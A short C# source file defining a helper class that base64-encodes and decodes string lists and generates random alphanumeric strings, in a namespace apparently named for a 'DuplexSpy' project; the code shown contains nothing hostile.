using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    internal class clsEZData
    {
        public clsEZData() { }

        const string szChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        public static List<string> fnListEncToB64(List<string> lsInput) => lsInput.Select(x => Crypto.b64E2Str(x)).ToList();
        public static List<string> fnListDecFromB64(List<string> lsInput) => lsInput.Select(x => Crypto.b64D2Str(x)).ToList();
        public static string fnListStrToStr(List<string> lsInput, string szSplitter = ",") => string.Join(szSplitter, fnListEncToB64(lsInput));
        public static List<string> fnStrToListStr(string szInput, string szSplitter = ",") => fnListDecFromB64(szInput.Split(szSplitter).ToList());

        public static string fnGenerateRandomStr(int nLength = 10)
        {
            StringBuilder result = new StringBuilder(nLength);
            Random random = new Random();

            for (int i = 0; i < nLength; i++)
            {
                result.Append(szChars[random.Next(szChars.Length)]);
            }

            return result.ToString();
        }
    }
}
